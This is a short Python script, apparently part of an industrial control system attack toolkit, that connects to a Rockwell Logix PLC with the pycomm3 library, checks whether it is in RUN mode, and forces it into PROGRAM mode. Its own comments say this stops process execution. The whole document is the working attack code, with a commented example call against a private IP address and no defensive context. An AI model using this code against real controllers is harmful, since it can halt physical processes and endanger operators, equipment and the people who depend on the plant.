def logix_mode_change_attack(target_ip):
    """
    Force PLC from RUN to PROGRAM mode
    Stops process execution
    """
    from pycomm3 import LogixDriver

    with LogixDriver(target_ip) as plc:
        # Get current mode
        current_mode = plc.get_plc_mode()
        print(f"[*] Current mode: {current_mode}")

        if current_mode == 'RUN':
            # Switch to PROGRAM mode (stops PLC)
            result = plc.set_plc_mode('PROGRAM')
            print(f"[+] PLC set to PROGRAM mode: {result}")
            print("[!] Process execution stopped")

        # To restart:
        # plc.set_plc_mode('RUN')

# logix_mode_change_attack('192.168.1.100')
